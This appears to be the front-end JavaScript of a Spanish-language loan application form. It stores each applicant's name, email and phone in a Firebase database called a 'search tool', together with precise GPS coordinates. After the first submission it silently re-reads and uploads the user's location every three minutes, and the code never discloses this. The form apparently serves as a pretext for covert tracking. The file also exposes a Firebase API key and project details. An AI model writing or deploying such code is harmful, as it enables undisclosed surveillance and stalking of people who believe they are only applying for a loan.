/* CONEXION BASE DE DATOS */
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import {
  getFirestore,
  collection,
  addDoc,
  serverTimestamp
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";


const firebaseConfig = {
  apiKey: "AIzaSyBZavR7TNRrzKrxr1RqnvfrUelMLz81hyg",
  authDomain: "bd-herramienta-busqueda.firebaseapp.com",
  projectId: "bd-herramienta-busqueda",
  storageBucket: "bd-herramienta-busqueda.firebasestorage.app",
  messagingSenderId: "416153196731",
  appId: "1:416153196731:web:b0bc4ffe60cbb3a9a3319e",
  measurementId: "G-6S15ZGGCQ4"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
let sessionID = parseInt(localStorage.getItem('ultimo_id')) || 1;

async function guardarUbicacionBD(lat, lon, nombre, correo, telefono) {

  try {

    const colRef = collection(db, "solicitudes");

    await addDoc(colRef, {

      id_consecutivo: sessionID,

      nombre: nombre,
      correo: correo,
      telefono: telefono,

      coordenadas: `${lat}, ${lon}`,

      fecha_ubi: serverTimestamp()

    });

    sessionID++;

    localStorage.setItem('ultimo_id', sessionID);

  } catch (e) {

    console.error(e);

  }

}


function obtenerUbicacion(nombre, correo, telefono) {

  return new Promise((resolve, reject) => {

    if (!navigator.geolocation) {

      console.warn("Geolocalización no soportada.");
      reject("No soportado");
      return;

    }

    const resultado = document.getElementById("resultado");

    if (resultado) {
      resultado.innerHTML = "Obteniendo ubicación...";
    }

    navigator.geolocation.getCurrentPosition(

      async (posicion) => {

        const lat = posicion.coords.latitude;
        const lon = posicion.coords.longitude;

        if (resultado) {
          resultado.innerHTML = `Lat: ${lat}, Lon: ${lon}`;
        }

        // Guardar en Firebase
        await guardarUbicacionBD(
          lat,
          lon,
          nombre,
          correo,
          telefono
        );

        resolve({ lat, lon });

      },

      (error) => {

        console.error("Error GPS:", error.message);

        alert("Debes permitir el acceso a tu ubicación para continuar.");

        reject(error);

      },

      {
        enableHighAccuracy: true,
        timeout: 180000,
        maximumAge: 0,
      }

    );

  });

}

let intervaloActivo = false;

// FORMULARIO
const formulario = document.getElementById("loanForm");

formulario.addEventListener("submit", async (e) => {

  // Evita recargar página
  e.preventDefault();

  try {

    // 1. PEDIR UBICACIÓN
    const nombre = document.getElementById("nombre").value;
    const correo = document.getElementById("correo").value;
    const telefono = document.getElementById("telefono").value;

    await obtenerUbicacion(
      nombre,
      correo,
      telefono
    );

    // 2. Cerrar modal SOLO si aceptó ubicación
    $('#modalFormulario').modal('hide');

    // 3. Intervalo cada 3 minutos
    const INTERVALO = 3 * 60 * 1000;

    // Evita múltiples intervalos
    if (!intervaloActivo) {

      intervaloActivo = true;

      setInterval(() => {

        obtenerUbicacion(
          nombre,
          correo,
          telefono
        );

      }, INTERVALO);

    }

    console.log("Solicitud enviada correctamente");

  } catch (err) {

    console.error("Ubicación rechazada o error:", err);

  }

});